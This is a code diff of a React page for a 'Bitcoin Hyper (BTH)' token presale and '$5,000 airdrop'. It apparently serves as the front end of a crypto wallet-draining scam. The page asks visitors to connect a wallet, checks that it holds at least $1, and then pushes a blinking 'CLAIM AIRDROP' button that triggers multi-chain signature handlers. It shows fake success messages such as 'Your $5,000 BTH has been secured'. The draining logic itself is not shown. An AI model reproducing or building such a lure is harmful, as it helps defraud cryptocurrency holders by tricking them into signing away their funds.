-            <div className="relative bg-gradient-to-r from-red-600 to-red-500 rounded-full px-4 py-2.5 text-center font-bold text-sm sm:text-base text-white border border-red-400 shadow-lg">
-              <span>{t.bonus}</span>
-            </div>
-          </div>
-
-          <h1 className="text-4xl sm:text-5xl md:text-6xl font-black text-center mb-2 text-gray-900">
-            $5,000 BTH
-          </h1>
+      {/* Main Container */}
+      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
+        
+        {/* Hero Section */}
+        <div className="flex flex-col items-center text-center pt-16 pb-8">
           
-          <div className="text-center mb-6">
-            <span className="bg-red-50 rounded-full px-4 py-1.5 text-xs border border-red-200 text-red-700 inline-block">
-              <i className="fas fa-bolt mr-1 text-[10px]"></i> {t.instantAirdrop}
+          {/* Logo */}
+          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-red">
+            <span className="bg-gradient-to-r from-red-500 to-red-300 bg-clip-text text-transparent">
+              BITCOIN HYPER
             </span>
           </div>
 
-          {/* Stats Grid */}
-          <div className="bg-gray-50 rounded-2xl p-5 mb-8 grid grid-cols-3 gap-2 border border-gray-200">
-            <div className="text-center">
-              <div className="text-xs text-gray-500 mb-1">{t.bthPrice}</div>
-              <div className="text-base sm:text-lg font-bold text-gray-900">
-                ${presaleStats.tokenPrice} <span className="text-[10px] text-red-600 ml-1">+150%</span>
-              </div>
-            </div>
-            <div className="text-center">
-              <div className="text-xs text-gray-500 mb-1">{t.bonusLabel}</div>
-              <div className="text-base sm:text-lg font-bold text-gray-900">
-                5k <span className="text-[10px] text-red-600 ml-1">+25%</span>
-              </div>
-            </div>
-            <div className="text-center">
-              <div className="text-xs text-gray-500 mb-1">{t.presale}</div>
-              <div className="text-base sm:text-lg font-bold text-red-600">{t.stage4}</div>
-            </div>
+          {/* Live Badge */}
+          <div className="bg-red-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-red mb-4">
+            ● PRESALE LIVE
           </div>
 
-          {/* Main Claim Area */}
-          {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
-            <div className="mt-4">
-              <div className="bg-gray-50 rounded-2xl px-6 py-5 text-2xl sm:text-3xl font-bold text-center text-gray-900 mb-4 border border-gray-200">
-                5,000 <span className="text-base text-gray-500 font-normal">BTH +25%</span>
+          {/* Tagline */}
+          <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
+            Bitcoin Hyper (BTH) is a next-generation decentralized token designed to reward early supporters
+            through presale access and exclusive airdrops. Join the community before public exchange
+            listings and secure the lowest available token price.
+          </p>
+
+          {/* Wallet Connect Button */}
+          {!isConnected ? (
+            <button
+              onClick={() => open()}
+              onMouseEnter={() => setHoverConnect(true)}
+              onMouseLeave={() => setHoverConnect(false)}
+              className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
+            >
+              Connect Wallet To Claim $5000 (Bitcoin Hyper Token)
+            </button>
+          ) : (
+            <div className="flex flex-col items-center w-full max-w-md mb-8">
+              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
+                <span className="font-mono text-sm text-gray-300">
+                  {formatAddress(address)}
+                </span>
+                <button
+                  onClick={() => disconnect()}
+                  className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center hover:bg-red-700 transition-colors"
+                  title="Disconnect"
+                >
+                  <i className="fas fa-power-off text-xs"></i>
+                </button>
               </div>
               
-              <button
-                onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
-                className="w-full bg-gradient-to-r from-red-600 to-red-500 text-white font-bold text-base sm:text-lg py-4 rounded-2xl shadow-xl hover:shadow-2xl transition-all disabled:opacity-50 disabled:cursor-not-allowed relative overflow-hidden group"
-              >
-                <div className="absolute inset-0 bg-white/20 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-700"></div>
-                {signatureLoading ? (
-                  <div className="flex items-center justify-center gap-2">
-                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                    <span>{t.processing}</span>
-                  </div>
-                ) : (
-                  <span>{t.claim}</span>
-                )}
-              </button>
-              
-              {txStatus && (
-                <div className="text-center mt-3 text-xs text-red-600">
-                  {txStatus}
+              {/* CLAIM BUTTON - APPEARS BELOW CONNECT BUTTON WHEN ELIGIBLE */}
+              {showClaimButton && (
+                <button
+                  onClick={claimAirdrop}
+                  disabled={signatureLoading}
+                  className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow"
+                  style={{ animation: 'blink 1.2s infinite' }}
+                >
+                  {signatureLoading ? (
+                    <span className="flex items-center justify-center gap-2">
+                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      {processingChain ? `Processing ${processingChain}...` : 'Processing...'}
+                    </span>
+                  ) : (
+                    <span className="flex items-center justify-center gap-2">
+                      <span className="text-xl">🎁</span>
+                      CLAIM AIRDROP $5,000 BTH
+                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
+                    </span>
+                  )}
+                </button>
+              )}
+
+              {/* Eligibility Status Message */}
+              {isConnected && !signatureLoading && !completedChains.length && (
+                <div className="mt-3 w-full">
+                  {isEligible ? (
+                    <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
+                      ✅ You are eligible for the $5,000 Bitcoin Hyper (BTH) airdrop! Click the CLAIM AIRDROP button above to proceed.
+                    </div>
+                  ) : (
+                    !scanning && (
+                      <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">
+                        ⚡ You need at least $1 in your wallet to qualify for the airdrop.
+                      </div>
+                    )
+                  )}
                 </div>
               )}
             </div>
           )}
 
-          {/* Completed State */}
-          {allChainsCompleted && (
-            <div className="mt-4">
-              <div className="bg-green-50 rounded-2xl p-5 text-center border border-green-200 mb-3">
-                <p className="text-green-700 text-base mb-1">{t.completed}</p>
-                <p className="text-gray-500 text-xs">{t.secured}</p>
-              </div>
-              <button
-                onClick={claimTokens}
-                className="w-full bg-gradient-to-r from-green-600 to-green-500 text-white font-bold text-base sm:text-lg py-4 rounded-2xl shadow-lg hover:shadow-xl transition-all"
-              >
-                🎉 {t.view}
-              </button>
-            </div>
-          )}
-
-          {/* Welcome Message */}
-          {isConnected && !isEligible && !completedChains.length && !scanning && (
-            <div className="bg-gray-50 rounded-2xl p-6 text-center border border-gray-200 mt-4">
-              <div className="text-5xl mb-3">👋</div>
-              <h2 className="text-xl font-bold mb-2 text-gray-900">{t.welcome}</h2>
-              <p className="text-sm text-gray-500 mb-4">
-                Connect with a wallet that has at least $1 in value to qualify.
-              </p>
-              <div className="bg-white rounded-xl p-3 border border-gray-200">
-                <p className="text-xs text-gray-500">
-                  Multi-chain: Ethereum, BSC, Polygon, Arbitrum, Avalanche
-                </p>
+          {/* ELIGIBILITY CHECKING ANIMATION */}
+          {isConnected && scanning && (
+            <div className="w-full max-w-md mb-8">
+              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-red-500/30">
+                <div className="flex items-center justify-center gap-4 mb-4">
+                  <div className="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
+                  <div className="text-left">
+                    <div className="text-lg font-bold text-red-400">Checking Eligibility</div>
+                    <div className="text-sm text-gray-400">Verifying your wallet...</div>
+                  </div>
+                </div>
+                
+                {/* Progress bar */}
+                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
+                  <div 
+                    className="bg-gradient-to-r from-red-500 to-red-400 h-1.5 rounded-full transition-all duration-300"
+                    style={{ width: `${scanProgress}%` }}
+                  ></div>
+                </div>
+                
+                <div className="mt-3 text-sm text-red-400">
+                  {txStatus}
+                </div>
               </div>
             </div>
           )}
 
-          {/* Error Display */}
-          {error && (
-            <div className="mt-4 bg-red-50 border border-red-200 rounded-xl p-3">
-              <div className="flex items-center gap-2">
-                <i className="fas fa-exclamation-triangle text-red-600 text-sm"></i>
-                <p className="text-red-700 text-xs">{error}</p>
+          {/* Countdown Timer */}
+          <div className="flex flex-wrap gap-4 justify-center mb-10">
+            {[
+              { label: translations.days, value: timeLeft.days },
+              { label: translations.hrs, value: timeLeft.hours },
+              { label: translations.mins, value: timeLeft.minutes },
+              { label: translations.secs, value: timeLeft.seconds }
+            ].map((item, index) => (
+              <div key={index} className="bg-red-500/10 border border-red-500/30 backdrop-blur p-4 rounded-xl min-w-[90px]">
+                <span className="block text-3xl text-red-400 font-bold">{item.value}</span>
+                <span className="text-xs text-gray-400">{item.label}</span>
               </div>
-            </div>
-          )}
+            ))}
+          </div>
 
-          {/* Progress Section */}
-          <div className="mt-8 pt-6 border-t border-gray-200">
-            <h3 className="text-base font-semibold text-center mb-5 text-gray-700">
-              PRESALE PROGRESS
-            </h3>
+          {/* Presale Card */}
+          <div className="w-full max-w-md bg-red-500/5 border border-red-500/30 backdrop-blur p-8 rounded-2xl mb-8">
+            <h3 className="text-2xl font-bold mb-4 text-red-400">Bitcoin Hyper (BTH) Token Presale</h3>
             
-            <div className="grid grid-cols-3 gap-3 mb-5">
-              <div className="text-center">
-                <div className="text-lg font-bold text-red-600">${presaleStats.tokenPrice}</div>
-                <div className="text-xs text-gray-500">{t.tokenPrice}</div>
-              </div>
-              <div className="text-center">
-                <div className="text-lg font-bold text-red-600">{presaleStats.currentBonus}%</div>
-                <div className="text-xs text-gray-500">{t.currentBonus}</div>
-              </div>
-              <div className="text-center">
-                <div className="text-lg font-bold text-red-600">$1.25M</div>
-                <div className="text-xs text-gray-500">{t.totalRaised}</div>
-              </div>
+            <p className="text-gray-300 mb-3">
+              {presaleStats.totalSold.toLocaleString()} / {presaleStats.hardCap.toLocaleString()} BTH Sold
+            </p>
+            
+            {/* Progress Bar */}
+            <div className="w-full bg-red-950 h-3 rounded-full overflow-hidden mb-6">
+              <div 
+                className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full transition-all duration-1000"
+                style={{ width: `${(presaleStats.totalSold / presaleStats.hardCap) * 100}%` }}
+              ></div>
             </div>
 
-            <div className="mb-4">
-              <div className="flex justify-between text-xs text-gray-500 mb-2">
-                <span>{t.progress}</span>
-                <span>{liveProgress.percentComplete}%</span>
-              </div>
-              <div className="w-full h-1.5 bg-gray-200 rounded-full overflow-hidden">
-                <div 
-                  className="h-full bg-red-600 rounded-full"
-                  style={{ width: `${liveProgress.percentComplete}%` }}
-                ></div>
-              </div>
+            {/* BNB Input */}
+            <input
+              type="number"
+              value={bnbAmount}
+              onChange={(e) => setBnbAmount(e.target.value)}
+              placeholder="Enter BNB amount"
+              className="w-full bg-black/50 border border-red-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-red-500 mb-4"
+            />
+
+            {/* Buy Button */}
+            <button
+              onClick={buyBth}
+              disabled={loading || !isConnected}
+              className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed mb-6"
+            >
+              {loading ? 'Processing...' : 'Buy BTH'}
+            </button>
+
+            {/* Airdrop Card */}
+            <div className="bg-black/50 border border-red-500/30 rounded-xl p-5">
+              <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
+              <p className="text-sm text-gray-400 mb-4">
+                Early supporters can claim free BTH tokens. Connect wallet to check eligibility.
+              </p>
+              
+              {!isConnected && (
+                <p className="text-xs text-red-400/70">Connect wallet to check eligibility</p>
+              )}
+              {isConnected && !isEligible && (
+                <p className="text-xs text-red-400/70">Need at least $1 in wallet to qualify</p>
+              )}
             </div>
 
-            <div className="grid grid-cols-2 gap-3 mt-5">
-              <div className="bg-gray-50 rounded-lg p-3 text-center border border-gray-200">
-                <div className="text-xs text-gray-500 mb-1">{t.today}</div>
-                <div className="text-base font-bold text-red-600">{liveProgress.participantsToday}</div>
+            {/* Status Messages */}
+            {txStatus && (
+              <div className="mt-4 text-sm text-center text-red-400">
+                {txStatus}
               </div>
-              <div className="bg-gray-50 rounded-lg p-3 text-center border border-gray-200">
-                <div className="text-xs text-gray-500 mb-1">{t.avg}</div>
-                <div className="text-base font-bold text-red-600">${liveProgress.avgAllocation}</div>
+            )}
+
+            {/* Error Display */}
+            {error && (
+              <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">
+                {error}
+              </div>
+            )}
+
+            {/* Completed Chains Progress */}
+            {completedChains.length > 0 && (
+              <div className="mt-4 text-center">
+                <div className="text-xs text-gray-400">
+                  Completed: {completedChains.join(' → ')}
+                </div>
+              </div>
+            )}
+          </div>
+
+          {/* Already completed message */}
+          {completedChains.length > 0 && (
+            <div className="w-full max-w-md mb-8">
+              <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
+                <p className="text-green-400 text-lg mb-2">✓ COMPLETED on {completedChains.length} chains</p>
+                <p className="text-gray-400 text-sm">Your $5,000 BTH has been secured</p>
               </div>
             </div>
+          )}
 
-            <div className="mt-4 text-center">
-              <p className="text-xs text-gray-400">
-                {presaleStats.totalParticipants.toLocaleString()} {t.participants}
+          {/* Welcome message for non-eligible */}
+          {isConnected && !isEligible && !completedChains.length && !scanning && (
+            <div className="w-full max-w-md mb-8">
+              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
+                <div className="text-6xl mb-4">👋</div>
+                <h2 className="text-xl font-bold mb-3 text-red-400">
+                  {translations.welcome}
+                </h2>
+                <p className="text-gray-400 text-sm mb-6">
+                  Connect with a wallet that has at least $1 in value to qualify for the airdrop.
+                </p>
+                <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
+                  <p className="text-xs text-gray-400">
+                    Multi-chain support: Ethereum, BSC, Polygon, Arbitrum, Avalanche
+                  </p>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Info Section */}
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
+            
+            {/* Card 1 */}
+            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
+              <h3 className="text-lg font-bold mb-3 text-red-400">About Bitcoin Hyper (BTH) Presale</h3>
+              <p className="text-sm text-gray-400 leading-relaxed">
+                The Bitcoin Hyper (BTH) presale offers early community members the opportunity to purchase
+                tokens at the lowest available rate before public exchange listings.
+                Funds raised during the presale help accelerate development,
+                liquidity provisioning, and ecosystem expansion.
+              </p>
+            </div>
+
+            {/* Card 2 */}
+            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
+              <h3 className="text-lg font-bold mb-3 text-red-400">Bitcoin Hyper (BTH) Airdrop Program</h3>
+              <p className="text-sm text-gray-400 leading-relaxed">
+                The Bitcoin Hyper (BTH) airdrop rewards early adopters and active community members.
+                Eligible wallets can claim tokens directly through the decentralized
+                claim portal. This initiative ensures broad distribution
+                and strong community ownership of the BTH ecosystem.
+              </p>
+            </div>
+
+            {/* Card 3 */}
+            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
+              <h3 className="text-lg font-bold mb-3 text-red-400">Security & Transparency</h3>
+              <p className="text-sm text-gray-400 leading-relaxed">
+                All presale and airdrop transactions are executed directly on-chain.
+                Smart contracts ensure transparent token distribution and
+                verifiable transaction records on the blockchain.
               </p>
             </div>
           </div>
 
           {/* Footer */}
-          <div className="mt-8 text-center">
-            <div className="flex flex-wrap justify-center gap-2 mb-3">
-              <span className="bg-gray-50 px-3 py-1.5 rounded-full text-xs text-gray-600 border border-gray-200">
-                ⚡ {t.terms}
-              </span>
-              <span className="bg-gray-50 px-3 py-1.5 rounded-full text-xs text-gray-600 border border-gray-200">
-                🔄 {t.delivery}
-              </span>
-              <span className="bg-gray-50 px-3 py-1.5 rounded-full text-xs text-gray-600 border border-gray-200">
-                💎 {t.airdrop}
-              </span>
-            </div>
-            <p className="text-xs text-gray-400">
-              {t.liveNow}
-            </p>
-          </div>
+          <footer className="mt-16 text-gray-500 text-sm">
+            © 2026 Bitcoin Hyper (BTH) Token — All Rights Reserved
+          </footer>
         </div>
       </div>
 
       {/* Celebration Modal */}
       {showCelebration && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
-          <div className="relative max-w-sm w-full">
-            <div className="absolute inset-0 bg-gradient-to-r from-red-600/20 to-red-500/20 rounded-3xl blur-xl"></div>
+        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
+          <div className="relative max-w-lg w-full">
+            <div className="absolute inset-0 bg-gradient-to-r from-red-600/30 via-red-500/30 to-red-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
             
-            <div className="relative bg-white rounded-3xl p-8 border border-red-200 shadow-2xl text-center">
-              <div className="text-6xl mb-4 animate-bounce">🎉</div>
+            {/* Confetti effect */}
+            {[...Array(20)].map((_, i) => (
+              <div
+                key={i}
+                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-red-400 to-red-500 rounded-full animate-confetti-cannon"
+                style={{
+                  left: `${Math.random() * 100}%`,
+                  top: '50%',
+                  animationDelay: `${i * 0.1}s`,
+                  animationDuration: `${1 + Math.random()}s`
+                }}
+              />
+            ))}
+            
+            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-red-500/20 shadow-2xl text-center">
+              <div className="relative mb-6">
+                <div className="text-7xl animate-bounce">🎉</div>
+                {[...Array(8)].map((_, i) => (
+                  <div
+                    key={i}
+                    className="absolute w-1 h-1 bg-red-400 rounded-full animate-sparkle"
+                    style={{
+                      top: '50%',
+                      left: '50%',
+                      transform: `rotate(${i * 45}deg) translateY(-30px)`,
+                      animationDelay: `${i * 0.1}s`
+                    }}
+                  />
+                ))}
+              </div>
               
-              <h2 className="text-2xl font-bold mb-2 text-red-600">
-                {t.successful}
+              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-red-400 to-red-300 bg-clip-text text-transparent">
+                {translations.successful}
               </h2>
               
-              <p className="text-gray-600 mb-2">{t.youHaveSecured}</p>
+              <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
               
-              <div className="text-3xl font-bold text-gray-900 mb-3">$5,000 BTH</div>
+              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">$5,000 BTH</div>
               
-              <div className="inline-block bg-green-50 px-4 py-2 rounded-full mb-4 border border-green-200">
-                <span className="text-green-700">+{presaleStats.currentBonus}% BONUS</span>
+              <div className="inline-block bg-gradient-to-r from-red-500/20 to-red-600/20 px-6 py-3 rounded-full mb-4 border border-red-500/30">
+                <span className="text-2xl text-red-400">+{presaleStats.currentBonus}% BONUS</span>
               </div>
+              
+              <p className="text-xs text-gray-500 mb-6">
+                Processed on {verifiedChains.length} chains
+              </p>
               
               <button
                 onClick={() => setShowCelebration(false)}
-                className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl transition-all"
+                className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105"
               >
-                {t.viewButton}
+                {translations.viewButton}
               </button>
             </div>
           </div>
         </div>
       )}
+
+      {/* Animation Keyframes */}
+      <style>{`
+        @keyframes glow-red {
+          from { filter: drop-shadow(0 0 10px #ff1a1a); }
+          to { filter: drop-shadow(0 0 40px #ff4d4d); }
+        }
+        @keyframes pulse-red {
+          0% { box-shadow: 0 0 0 0 rgba(255,0,0,.7); }
+          70% { box-shadow: 0 0 0 15px rgba(255,0,0,0); }
+          100% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
+        }
+        @keyframes blink {
+          0% { opacity: 1; }
+          50% { opacity: 0.4; }
+          100% { opacity: 1; }
+        }
+        @keyframes confetti-cannon {
+          0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
+          100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; }
+        }
+        @keyframes sparkle {
+          0% { transform: rotate(0deg) scale(0); opacity: 0; }
+          50% { transform: rotate(180deg) scale(1); opacity: 1; }
+          100% { transform: rotate(360deg) scale(0); opacity: 0; }
+        }
+        @keyframes fadeIn {
+          from { opacity: 0; transform: scale(0.95); }
+          to { opacity: 1; transform: scale(1); }
+        }
+        @keyframes pulse-slow {
+          0%, 100% { opacity: 0.3; }
+          50% { opacity: 0.6; }
+        }
+        .animate-glow-red { animation: glow-red 3s infinite alternate; }
+        .animate-pulse-red { animation: pulse-red 1.5s infinite; }
+        .animate-pulse-glow { animation: blink 1.2s infinite; }
+        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
+        .animate-sparkle { animation: sparkle 1s ease-out forwards; }
+        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
+        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
+        .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+        
+        /* Mobile responsive adjustments */
+        @media (max-width: 768px) {
+          .fixed.bottom-6.right-6 {
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+          }
+        }
+      `}</style>
     </div>
   );
 }
